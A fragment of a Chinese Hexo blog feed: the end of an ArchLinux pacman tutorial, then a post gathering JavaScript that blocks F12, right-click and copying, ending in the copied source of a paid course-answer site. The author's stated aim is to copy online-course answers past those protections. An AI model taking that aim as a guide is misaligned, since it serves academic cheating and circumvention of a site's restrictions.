pacman-contrib 提供的 paccache 命令默认会删除近3个版本前的软件包 1# paccache -r Tip: 可以使用 pacman hooks 自动执行清理，这里是参考示例。 也可以自己设置保留最近几个版本： 1# paccache -rk 1 清理所有未安装包的缓存文件，再此运行paccache: 1# paccache -ruk0 更多功能参见paccache -h。 paccache，还可以使用 Arch User Repository) 中的 pkgcachecleanAUR： 1# pkgcacheclean ，以及pacleanerAUR，这两个是未来的替代工具. 其它命令升级系统时安装其他软件包： 1$ pacman -Syu package_name1 package_name2 ... 下载包而不安装它： 1$ pacman -Sw package_name 安装一个本地包(不从源里下载）： 1$ pacman -U /path/to/package/package_name-version.pkg.tar.xz 要将本地包保存至缓存，可执行： 1$ pacman -U file://path/to/package/package_name-version.pkg.tar.xz 安装一个远程包（不在 pacman 配置的源里面）： 1$ pacman -U http://www.example.com/repo/example.pkg.tar.xz 要禁用 -S, -U 和 -R 动作，可以使用 -p 选项. pacman 会列出需要安装和删除的软件，并在执行动作前要求需要的权限。 安装原因pacman数据库按照软件包被安装的原因，将其分为两类： 指定安装包：通过pacman-S或者-U指令安装的软件包。 依赖包：指定安装包所依赖的软件包，尽管命令中未传入，但仍然会被安装。 当安装软件包时，可以把安装原因指定设为依赖: 1# pacman -S --asdeps package_name 但是当重新安装该软件包时，安装原因将会被设为软件包所默认的。 指定安装的软件包列表可用pacman -Qe, 已安装的依赖包可用pacman -Qd获取。 改变某个已安装软件包的安装原因，可以执行： 1# pacman -D --asdeps package_name 使用--asexplicit改为指定安装。 查询一个包含具体文件的包名同步文件数据库: 1# pacman -Fy 查询包含某个文件的包名，比如: 123456# pacman -Fs pacmancore/pacman 5.0.1-4 usr/bin/pacman usr/share/bash-completion/completions/pacmanextra/xscreensaver 5.36-1 usr/lib/xscreensaver/pacman 提示： 可以设置一个 crontab 或者 systemd timer 来定期同步文件信息数据库。 如果需要高级功能请安装 pkgfile，它使用一个单独的数据库来保存文件和它们所关联的软件包的信息。 ArchLinux的版本库里面包括： core-核心软件包 extra-其他常用软件 community-社区软件包，譬如Mysql等。 testing-正在测试阶段，还没有正式加入源的软件包。通常软件版本比较新，但是不是非常稳定 release-已经发布的软件包 unstable-非正式的软件包，可能包括以前版本的软件或者测试软件 因为Pacman的软件都是从源里面更新，因此在/etc/pacman.d里面配置这些软件源的地址。在/etc/pacman.d目录里面分别有上面几种软件类型对应的文件名，可以自己手工配置这些软件源的地址。]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ArchLinux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js_banned]]></title>
    <url>%2F2019%2F10%2F09%2Fjs-banned%2F</url>
    <content type="text"><![CDATA[序：原本想从网页上搞些网课答案下来，懒得用爬虫，便想直接复制粘贴更方便，结果遭遇了网页的复制和控制台禁用，本着求知的精神，就有了这篇文章。 网页中部分禁用及破解 利用js实现 禁用F12 12345678910&lt;script&gt;document.οnkeydοwn=function (e)&#123; var currKey=0,evt=e||window.event; currKey=evt.keyCode||evt.which||evt.charCode; if (currKey == 123) &#123; window.event.cancelBubble = true; window.event.returnValue = false; &#125; &#125;&lt;/script&gt; 123456789101112131415161718&lt;script&gt;var h = window.innerHeight,w=window.innerWidth;//禁用右键 （防止右键查看源代码）window.oncontextmenu=function()&#123;&lt;br&gt; return false;&lt;br&gt;&#125;//在本网页的任何键盘敲击事件都是无效操作 （防止F12和shift+ctrl+i调起开发者工具）window.onkeydown = window.onkeyup = window.onkeypress = function () &#123; window.event.returnValue = false; return false;&#125;//如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面window.onresize = function () &#123; if (h != window.innerHeight||w!=window.innerWidth)&#123; window.close(); window.location = "about:blank"; &#125;&#125;; &lt;/script&gt; 1234567891011121314151617181920212223242526272829&lt;script&gt;(document).keydown(function() &#123; return key(arguments[0])&#125;);function key(e) &#123; //f12 var keynum; if (window.event) &#123; keynum = e.keyCode; &#125; else if (e.which) &#123; keynum = e.which; &#125; if (keynum == 123) &#123; window.close(); return false; &#125; //ctrl+shift if (event.shiftKey&amp;&amp;event.ctrlKey) &#123; window.close(); return false; &#125;&#125;function Click() &#123; window.event.returnValue = false;&#125;document.oncontextmenu = Click;// 右击&lt;/script&gt; 禁用右键菜单 123&lt;script&gt;document.oncontextmenu = function()&#123;return false;&#125;&lt;/script&gt; 禁用文本选择 123&lt;script&gt;document.onselectstart = function()&#123;return true;&#125;&lt;/script&gt; 一个网页：当禁用js时无法打开，不禁用js，禁止复制、看源码、右键菜单、F12、文本选择 适合学习 原网页：http://www.gebidemengmianren.com/eryadaanfufei/198.html?btwaf=99961145 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623&lt;!DOCTYPE html&gt;&lt;html lang="zh-CN"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="Cache-Control" content="no-transform" /&gt; &lt;meta http-equiv="Cache-Control" content="no-siteapp" /&gt; &lt;meta name="applicable-device" content="pc,mobile"&gt; &lt;meta name="MobileOptimized" content="width" /&gt; &lt;meta name="HandheldFriendly" content="true" /&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt; &lt;noscript&gt; &lt;meta http-equiv="refresh" content="0; url=http://www.gebidemengmianren.com/my-plugins/no-js.html" /&gt;&lt;/noscript&gt; &lt;link type="text/css" media="all" href="http://www.gebidemengmianren.com/wp-content/cache/autoptimize/css/autoptimize_fbc8fb4f52ab77546156f37a7cb23309.css" rel="stylesheet" /&gt; &lt;title&gt;当代中国政府与政治2019 &amp;#8211; 隔壁的萌面人&lt;/title&gt; &lt;link rel='stylesheet' id='dashicons-css' href='http://www.gebidemengmianren.com/wp-includes/css/dashicons.min.css?ver=6f0a90e1258fc95d5c87f731d5ec4784' type='text/css' media='all' /&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'&gt;&lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'&gt;&lt;/script&gt; &lt;!--[if lt IE 9]&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/html5shiv.min.js?ver=3.7.3'&gt;&lt;/script&gt; &lt;![endif]--&gt; &lt;script type='text/javascript'&gt; var wellington_menu_title = "\u83dc\u5355"; &lt;/script&gt; &lt;script type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/themes/wellington/js/navigation.js?ver=20160719'&gt;&lt;/script&gt; &lt;link rel='prev' title='密码保护：当代中国经济2019修正版' href='http://www.gebidemengmianren.com/eryadaanfufei/196.html' /&gt; &lt;link rel='next' title='密码保护：当政府遇上互联网2019' href='http://www.gebidemengmianren.com/eryadaanfufei/200.html' /&gt; &lt;link rel="canonical" href="http://www.gebidemengmianren.com/eryadaanfufei/198.html" /&gt; &lt;script type="text/javascript"&gt; document.ondragstart = function() &#123; return false &#125;; //for image document.oncontextmenu = function(e) &#123; return false &#125;; //for right click disable document.onkeydown = function(e) &#123; if (e.ctrlKey &amp;&amp; (e.keyCode === 65 || e.keyCode === 67 || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 80 || e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 117 )) &#123; return false; &#125; if (e.keyCode == 18 || e.keyCode == 123) &#123; return false &#125; &#125;; &lt;/script&gt; &lt;link rel="icon" href="http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g-150x150.jpg" sizes="32x32" /&gt; &lt;link rel="icon" href="http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg" sizes="192x192" /&gt; &lt;link rel="apple-touch-icon-precomposed" href="http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg" /&gt; &lt;meta name="msapplication-TileImage" content="http://www.gebidemengmianren.com/wp-content/uploads/2019/08/g.jpg" /&gt;&lt;/head&gt;&lt;body class="post-template-default single single-post postid-198 single-format-standard post-layout-one-column" id='body'&gt; &lt;script type="text/javascript"&gt; ! function(t, e) &#123; "object" == typeof exports &amp;&amp; "object" == typeof module ? module.exports = e() : "function" == typeof define &amp;&amp; define.amd ? define([], e) : "object" == typeof exports ? exports.ClipboardJS = e() : t.ClipboardJS = e() &#125;(this, function() &#123; return function(t) &#123; function e(o) &#123; if (n[o]) return n[o].exports; var r = n[o] = &#123; i: o, l: !1, exports: &#123;&#125; &#125;; return t[o].call(r.exports, r, r.exports, e), r.l = !0, r.exports &#125; var n = &#123;&#125;; return e.m = t, e.c = n, e.i = function(t) &#123; return t &#125;, e.d = function(t, n, o) &#123; e.o(t, n) || Object.defineProperty(t, n, &#123; configurable: !1, enumerable: !0, get: o &#125;) &#125;, e.n = function(t) &#123; var n = t &amp;&amp; t.__esModule ? function() &#123; return t.default &#125; : function() &#123; return t &#125;; return e.d(n, "a", n), n &#125;, e.o = function(t, e) &#123; return Object.prototype.hasOwnProperty.call(t, e) &#125;, e.p = "", e(e.s = 3) &#125;([function(t, e, n) &#123; var o, r, i; ! function(a, c) &#123; r = [t, n(7)], o = c, void 0 !== (i = "function" == typeof o ? o.apply(e, r) : o) &amp;&amp; (t.exports = i) &#125;(0, function(t, e) &#123; "use strict"; function n(t, e) &#123; if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") &#125; var o = function(t) &#123; return t &amp;&amp; t.__esModule ? t : &#123; default: t &#125; &#125;(e), r = "function" == typeof Symbol &amp;&amp; "symbol" == typeof Symbol.iterator ? function(t) &#123; return typeof t &#125; : function(t) &#123; return t &amp;&amp; "function" == typeof Symbol &amp;&amp; t.constructor === Symbol &amp;&amp; t !== Symbol.prototype ? "symbol" : typeof t &#125;, i = function() &#123; function t(t, e) &#123; for (var n = 0; n &lt; e.length; n++) &#123; var o = e[n]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o &amp;&amp; (o.writable = !0), Object.defineProperty(t, o.key, o) &#125; &#125; return function(e, n, o) &#123; return n &amp;&amp; t(e.prototype, n), o &amp;&amp; t(e, o), e &#125; &#125;(), a = function() &#123; function t(e) &#123; n(this, t), this.resolveOptions(e), this.initSelection() &#125; return i(t, [&#123; key: "resolveOptions", value: function() &#123; var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : &#123;&#125;; this.action = t.action, this.container = t.container, this.emitter = t.emitter, this.target = t.target, this.text = t.text, this.trigger = t.trigger, this.selectedText = "" &#125; &#125;, &#123; key: "initSelection", value: function() &#123; this.text ? this.selectFake() : this.target &amp;&amp; this.selectTarget() &#125; &#125;, &#123; key: "selectFake", value: function() &#123; var t = this, e = "rtl" == document.documentElement.getAttribute("dir"); this.removeFake(), this.fakeHandlerCallback = function() &#123; return t.removeFake() &#125;, this.fakeHandler = this.container.addEventListener("click", this.fakeHandlerCallback) || !0, this.fakeElem = document.createElement("textarea"), this.fakeElem.style.fontSize = "12pt", this.fakeElem.style.border = "0", this.fakeElem.style.padding = "0", this.fakeElem.style.margin = "0", this.fakeElem.style.position = "absolute", this.fakeElem.style[e ? "right" : "left"] = "-9999px"; var n = window.pageYOffset || document.documentElement.scrollTop; this.fakeElem.style.top = n + "px", this.fakeElem.setAttribute("readonly", ""), this.fakeElem.value = this.text, this.container.appendChild(this.fakeElem), this.selectedText = (0, o.default)(this.fakeElem), this.copyText() &#125; &#125;, &#123; key: "removeFake", value: function() &#123; this.fakeHandler &amp;&amp; (this.container.removeEventListener("click", this.fakeHandlerCallback), this.fakeHandler = null, this.fakeHandlerCallback = null), this.fakeElem &amp;&amp; (this.container.removeChild(this.fakeElem), this.fakeElem = null) &#125; &#125;, &#123; key: "selectTarget", value: function() &#123; this.selectedText = (0, o.default)(this.target), this.copyText() &#125; &#125;, &#123; key: "copyText", value: function() &#123; var t = void 0; try &#123; t = document.execCommand(this.action) &#125; catch (e) &#123; t = !1 &#125; this.handleResult(t) &#125; &#125;, &#123; key: "handleResult", value: function(t) &#123; this.emitter.emit(t ? "success" : "error", &#123; action: this.action, text: this.selectedText, trigger: this.trigger, clearSelection: this.clearSelection.bind(this) &#125;) &#125; &#125;, &#123; key: "clearSelection", value: function() &#123; this.trigger &amp;&amp; this.trigger.focus(), window.getSelection().removeAllRanges() &#125; &#125;, &#123; key: "destroy", value: function() &#123; this.removeFake() &#125; &#125;, &#123; key: "action", set: function() &#123; var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : "copy"; if (this._action = t, "copy" !== this._action &amp;&amp; "cut" !== this._action) throw new Error('Invalid "action" value, use either "copy" or "cut"') &#125;, get: function() &#123; return this._action &#125; &#125;, &#123; key: "target", set: function(t) &#123; if (void 0 !== t) &#123; if (!t || "object" !== (void 0 === t ? "undefined" : r(t)) || 1 !== t.nodeType) throw new Error('Invalid "target" value, use a valid Element'); if ("copy" === this.action &amp;&amp; t.hasAttribute("disabled")) throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute'); if ("cut" === this.action &amp;&amp; (t.hasAttribute("readonly") || t.hasAttribute("disabled"))) throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes'); this._target = t &#125; &#125;, get: function() &#123; return this._target &#125; &#125;]), t &#125;(); t.exports = a &#125;) &#125;, function(t, e, n) &#123; function o(t, e, n) &#123; if (!t &amp;&amp; !e &amp;&amp; !n) throw new Error("Missing required arguments"); if (!c.string(e)) throw new TypeError("Second argument must be a String"); if (!c.fn(n)) throw new TypeError("Third argument must be a Function"); if (c.node(t)) return r(t, e, n); if (c.nodeList(t)) return i(t, e, n); if (c.string(t)) return a(t, e, n); throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList") &#125; function r(t, e, n) &#123; return t.addEventListener(e, n), &#123; destroy: function() &#123; t.removeEventListener(e, n) &#125; &#125; &#125; function i(t, e, n) &#123; return Array.prototype.forEach.call(t, function(t) &#123; t.addEventListener(e, n) &#125;), &#123; destroy: function() &#123; Array.prototype.forEach.call(t, function(t) &#123; t.removeEventListener(e, n) &#125;) &#125; &#125; &#125; function a(t, e, n) &#123; return u(document.body, t, e, n) &#125; var c = n(6), u = n(5); t.exports = o &#125;, function(t, e) &#123; function n() &#123;&#125; n.prototype = &#123; on: function(t, e, n) &#123; var o = this.e || (this.e = &#123;&#125;); return (o[t] || (o[t] = [])).push(&#123; fn: e, ctx: n &#125;), this &#125;, once: function(t, e, n) &#123; function o() &#123; r.off(t, o), e.apply(n, arguments) &#125; var r = this; return o._ = e, this.on(t, o, n) &#125;, emit: function(t) &#123; var e = [].slice.call(arguments, 1), n = ((this.e || (this.e = &#123;&#125;))[t] || []).slice(), o = 0, r = n.length; for (o; o &lt; r; o++) n[o].fn.apply(n[o].ctx, e); return this &#125;, off: function(t, e) &#123; var n = this.e || (this.e = &#123;&#125;), o = n[t], r = []; if (o &amp;&amp; e) for (var i = 0, a = o.length; i &lt; a; i++) o[i].fn !== e &amp;&amp; o[i].fn._ !== e &amp;&amp; r.push(o[i]); return r.length ? n[t] = r : delete n[t], this &#125; &#125;, t.exports = n &#125;, function(t, e, n) &#123; var o, r, i; ! function(a, c) &#123; r = [t, n(0), n(2), n(1)], o = c, void 0 !== (i = "function" == typeof o ? o.apply(e, r) : o) &amp;&amp; (t.exports = i) &#125;(0, function(t, e, n, o) &#123; "use strict"; function r(t) &#123; return t &amp;&amp; t.__esModule ? t : &#123; default: t &#125; &#125; function i(t, e) &#123; if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") &#125; function a(t, e) &#123; if (!t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !e || "object" != typeof e &amp;&amp; "function" != typeof e ? t : e &#125; function c(t, e) &#123; if ("function" != typeof e &amp;&amp; null !== e) throw new TypeError("Super expression must either be null or a function, not " + typeof e); t.prototype = Object.create(e &amp;&amp; e.prototype, &#123; constructor: &#123; value: t, enumerable: !1, writable: !0, configurable: !0 &#125; &#125;), e &amp;&amp; (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e) &#125; function u(t, e) &#123; var n = "data-clipboard-" + t; if (e.hasAttribute(n)) return e.getAttribute(n) &#125; var l = r(e), s = r(n), f = r(o), d = "function" == typeof Symbol &amp;&amp; "symbol" == typeof Symbol.iterator ? function(t) &#123; return typeof t &#125; : function(t) &#123; return t &amp;&amp; "function" == typeof Symbol &amp;&amp; t.constructor === Symbol &amp;&amp; t !== Symbol.prototype ? "symbol" : typeof t &#125;, h = function() &#123; function t(t, e) &#123; for (var n = 0; n &lt; e.length; n++) &#123; var o = e[n]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o &amp;&amp; (o.writable = !0), Object.defineProperty(t, o.key, o) &#125; &#125; return function(e, n, o) &#123; return n &amp;&amp; t(e.prototype, n), o &amp;&amp; t(e, o), e &#125; &#125;(), p = function(t) &#123; function e(t, n) &#123; i(this, e); var o = a(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this)); return o.resolveOptions(n), o.listenClick(t), o &#125; return c(e, t), h(e, [&#123; key: "resolveOptions", value: function() &#123; var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : &#123;&#125;; this.action = "function" == typeof t.action ? t.action : this.defaultAction, this.target = "function" == typeof t.target ? t.target : this.defaultTarget, this.text = "function" == typeof t.text ? t.text : this.defaultText, this.container = "object" === d(t.container) ? t.container : document.body &#125; &#125;, &#123; key: "listenClick", value: function(t) &#123; var e = this; this.listener = (0, f.default)(t, "click", function(t) &#123; return e.onClick(t) &#125;) &#125; &#125;, &#123; key: "onClick", value: function(t) &#123; var e = t.delegateTarget || t.currentTarget; this.clipboardAction &amp;&amp; (this.clipboardAction = null), this.clipboardAction = new l.default(&#123; action: this.action(e), target: this.target(e), text: this.text(e), container: this.container, trigger: e, emitter: this &#125;) &#125; &#125;, &#123; key: "defaultAction", value: function(t) &#123; return u("action", t) &#125; &#125;, &#123; key: "defaultTarget", value: function(t) &#123; var e = u("target", t); if (e) return document.querySelector(e) &#125; &#125;, &#123; key: "defaultText", value: function(t) &#123; return u("text", t) &#125; &#125;, &#123; key: "destroy", value: function() &#123; this.listener.destroy(), this.clipboardAction &amp;&amp; (this.clipboardAction.destroy(), this.clipboardAction = null) &#125; &#125;], [&#123; key: "isSupported", value: function() &#123; var t = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : ["copy", "cut"], e = "string" == typeof t ? [t] : t, n = !!document.queryCommandSupported; return e.forEach(function(t) &#123; n = n &amp;&amp; !!document.queryCommandSupported(t) &#125;), n &#125; &#125;]), e &#125;(s.default); t.exports = p &#125;) &#125;, function(t, e) &#123; function n(t, e) &#123; for (; t &amp;&amp; t.nodeType !== o;) &#123; if ("function" == typeof t.matches &amp;&amp; t.matches(e)) return t; t = t.parentNode &#125; &#125; var o = 9; if ("undefined" != typeof Element &amp;&amp; !Element.prototype.matches) &#123; var r = Element.prototype; r.matches = r.matchesSelector || r.mozMatchesSelector || r.msMatchesSelector || r.oMatchesSelector || r.webkitMatchesSelector &#125; t.exports = n &#125;, function(t, e, n) &#123; function o(t, e, n, o, r) &#123; var a = i.apply(this, arguments); return t.addEventListener(n, a, r), &#123; destroy: function() &#123; t.removeEventListener(n, a, r) &#125; &#125; &#125; function r(t, e, n, r, i) &#123; return "function" == typeof t.addEventListener ? o.apply(null, arguments) : "function" == typeof n ? o.bind(null, document).apply(null, arguments) : ("string" == typeof t &amp;&amp; (t = document.querySelectorAll(t)), Array.prototype.map.call( t, function(t) &#123; return o(t, e, n, r, i) &#125;)) &#125; function i(t, e, n, o) &#123; return function(n) &#123; n.delegateTarget = a(n.target, e), n.delegateTarget &amp;&amp; o.call(t, n) &#125; &#125; var a = n(4); t.exports = r &#125;, function(t, e) &#123; e.node = function(t) &#123; return void 0 !== t &amp;&amp; t instanceof HTMLElement &amp;&amp; 1 === t.nodeType &#125;, e.nodeList = function(t) &#123; var n = Object.prototype.toString.call(t); return void 0 !== t &amp;&amp; ("[object NodeList]" === n || "[object HTMLCollection]" === n) &amp;&amp; "length" in t &amp;&amp; (0 === t.length || e.node(t[0])) &#125;, e.string = function(t) &#123; return "string" == typeof t || t instanceof String &#125;, e.fn = function(t) &#123; return "[object Function]" === Object.prototype.toString.call(t) &#125; &#125;, function(t, e) &#123; function n(t) &#123; var e; if ("SELECT" === t.nodeName) t.focus(), e = t.value; else if ("INPUT" === t.nodeName || "TEXTAREA" === t.nodeName) &#123; var n = t.hasAttribute("readonly"); n || t.setAttribute("readonly", ""), t.select(), t.setSelectionRange(0, t.value.length), n || t.removeAttribute("readonly"), e = t.value &#125; else &#123; t.hasAttribute("contenteditable") &amp;&amp; t.focus(); var o = window.getSelection(), r = document.createRange(); r.selectNodeContents(t), o.removeAllRanges(), o.addRange(r), e = o.toString() &#125; return e &#125; t.exports = n &#125;]) &#125;); &lt;/script&gt; &lt;script&gt; var clipboard = new ClipboardJS('.entry-content', &#123; text: function() &#123; //return ''; &#125; &#125;); clipboard.on('success', function(e) &#123; //console.log(e); &#125;); clipboard.on('error', function(e) &#123; //console.log(e); &#125;); &lt;/script&gt; &lt;script type="text/javascript"&gt; str = "\x77\x77\x77\x2e\x67\x65\x62\x69\x64\x65\x6d\x65\x6e\x67\x6d\x69\x61\x6e\x72\x65\x6e\x2e\x63\x6f\x6d"; if (window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x6f\x73\x74"] != str) &#123; location["\x68\x72\x65\x66"] = location["\x68\x72\x65\x66"]["\x72\x65\x70\x6c\x61\x63\x65"](window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x6f\x73\x74"], str); &#125; &lt;/script&gt; &lt;div id="header-top" class="header-bar-wrap"&gt;&lt;/div&gt; &lt;div id="page" class="hfeed site"&gt; &lt;a class="skip-link screen-reader-text" href="#content"&gt;Skip to content&lt;/a&gt; &lt;header id="masthead" class="site-header clearfix" role="banner"&gt; &lt;div class="header-main container clearfix"&gt; &lt;div id="logo" class="site-branding clearfix"&gt; &lt;p class="site-title"&gt;&lt;a href="http://www.gebidemengmianren.com/" rel="home"&gt;隔壁的萌面人&lt;/a&gt;&lt;/p&gt; &lt;p class="site-description"&gt;最专业的大学资料分享平台&lt;/p&gt; &lt;/div&gt; &lt;div class="header-widgets clearfix"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div id="main-navigation-wrap" class="primary-navigation-wrap"&gt; &lt;nav id="main-navigation" class="primary-navigation navigation container clearfix" role="navigation"&gt; &lt;ul id="menu-menu-1" class="main-navigation-menu"&gt; &lt;li id="menu-item-2987" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2987"&gt;&lt;a href="http://www.gebidemengmianren.com/question-and-answer"&gt;常见问题解答&lt;/a&gt;&lt;/li&gt; &lt;li id="menu-item-2988" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2988"&gt;&lt;a href="http://www.gebidemengmianren.com/category/zhihuishu"&gt;智慧树&lt;/a&gt;&lt;/li&gt; &lt;li id="menu-item-2989" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-2989"&gt;&lt;a href="http://www.gebidemengmianren.com/category/eryadaanfufei"&gt;尔雅&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;/div&gt; &lt;/header&gt; &lt;div id="content" class="site-content container clearfix"&gt; &lt;section id="primary" class="content-single content-area"&gt; &lt;main id="main" class="site-main" role="main"&gt; &lt;article id="post-198" class="post-198 post type-post status-publish format-standard post-password-protected hentry category-eryadaanfufei"&gt; &lt;header class="entry-header"&gt; &lt;div class="entry-meta"&gt;&lt;span class="meta-date"&gt;&lt;a href="http://www.gebidemengmianren.com/eryadaanfufei/198.html" title="下午10:02" rel="bookmark"&gt;&lt;time class="entry-date published updated" datetime="2019-03-20T22:02:27+00:00"&gt;2019年3月20日&lt;/time&gt;&lt;/a&gt;&lt;/span&gt;&lt;span class="meta-author"&gt; &lt;span class="author vcard"&gt;&lt;a class="url fn n" href="http://www.gebidemengmianren.com/author/meng" title="View all posts by gebilaowang" rel="author"&gt;gebilaowang&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt; &lt;h1 class="entry-title"&gt;密码保护：当代中国政府与政治2019&lt;/h1&gt; &lt;/header&gt; &lt;footer class="entry-footer"&gt; &lt;div class="entry-categories clearfix"&gt; &lt;span class="meta-categories"&gt; &lt;a href="http://www.gebidemengmianren.com/category/eryadaanfufei" rel="category tag"&gt;尔雅&lt;/a&gt; &lt;/span&gt;&lt;/div&gt; &lt;nav class="navigation post-navigation" role="navigation"&gt; &lt;h2 class="screen-reader-text"&gt;文章导航&lt;/h2&gt; &lt;div class="nav-links"&gt; &lt;div class="nav-previous"&gt;&lt;a href="http://www.gebidemengmianren.com/eryadaanfufei/196.html" rel="prev"&gt;&lt;span class="screen-reader-text"&gt;Previous Post:&lt;/span&gt;当代中国经济2019修正版&lt;/a&gt;&lt;/div&gt; &lt;div class="nav-next"&gt;&lt;a href="http://www.gebidemengmianren.com/eryadaanfufei/200.html" rel="next"&gt;&lt;span class="screen-reader-text"&gt;Next Post:&lt;/span&gt;当政府遇上互联网2019&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/nav&gt; &lt;/footer&gt; &lt;/article&gt; &lt;div id="comments" class="comments-area"&gt;&lt;/div&gt; &lt;/main&gt; &lt;/section&gt; &lt;section id="secondary" class="sidebar widget-area clearfix sidebar-my-flag" role="complementary"&gt; &lt;aside id="search-6" class="widget widget_search clearfix"&gt; &lt;form role="search" method="get" class="search-form" action="http://www.gebidemengmianren.com/"&gt; &lt;label&gt; &lt;span class="screen-reader-text"&gt;Search for:&lt;/span&gt; &lt;input type="search" class="search-field" placeholder="搜索 &amp;hellip;" value="" name="s" title="Search for:" /&gt; &lt;/label&gt; &lt;button type="submit" class="search-submit"&gt; &lt;span class="genericon-search"&gt;&lt;/span&gt; &lt;span class="screen-reader-text"&gt;Search&lt;/span&gt; &lt;/button&gt;&lt;/form&gt; &lt;/aside&gt; &lt;/section&gt; &lt;/div&gt; &lt;a href="http://www.gebidemengmianren.com/question-and-answer" target="_blank"&gt; &lt;div class="livechat-girl animated"&gt; &lt;img class="girl" src="http://www.gebidemengmianren.com/kefu/images/en_3.png"&gt; &lt;div class="livechat-hint rd-notice-tooltip rd-notice-type-success rd-notice-position-left single-line show_hint"&gt; &lt;div class="rd-notice-content"&gt; 我来帮您！&lt;/div&gt; &lt;/div&gt; &lt;div class="animated-circles"&gt; &lt;div class="circle c-1"&gt;&lt;/div&gt; &lt;div class="circle c-2"&gt;&lt;/div&gt; &lt;div class="circle c-3"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;link href="http://www.xuexianswer.com/kefu/css/css.css" rel="stylesheet" media="screen"&gt; &lt;script type="text/javascript" src="http://www.xuexianswer.com/kefu/js/jquery-1.7.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="http://www.xuexianswer.com/kefu/js/kefu.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="http://www.gebidemengmianren.com/kefu/js/en_3.js"&gt;&lt;/script&gt; &lt;div id="footer" class="footer-wrap"&gt; &lt;footer id="colophon" class="site-footer container clearfix" role="contentinfo"&gt; &lt;div align="center"&gt; &lt;a href="http://www.gebidemengmianren.com/" style='text-decoration:none; color:#939393;'&gt;&amp;copy;隔壁的萌面人&lt;/a&gt; &lt;/br&gt; &lt;a href="http://www.beian.miit.gov.cn/" style='text-decoration:none;color:#939393;'&gt;渝ICP备17014860号-2&lt;/a&gt; &lt;/br&gt; &lt;a target="_blank" href="" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"&gt;&lt;img src="http://www.xuexianswer.com/beian/logo.png" style="float:left;" /&gt; &lt;p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;"&gt;渝公网安备 50011402500333号&lt;/p&gt; &lt;/a&gt; &lt;br&gt; &lt;span align="right" style="display:inline-block;float:right;color:#303030;text-decoration:none;"&gt;友情链接： &lt;a href="http://www.xuexianswer.com/" style="color:#303030;text-decoration:none;"&gt;萌面人资料铺&lt;/a&gt;&amp;nbsp; &lt;a href="http://www.mengmianren.com/" style="color:#303030;text-decoration:none;"&gt;萌面人网&lt;/a&gt;&amp;nbsp; &lt;a href="http://mengmianren.cc/" 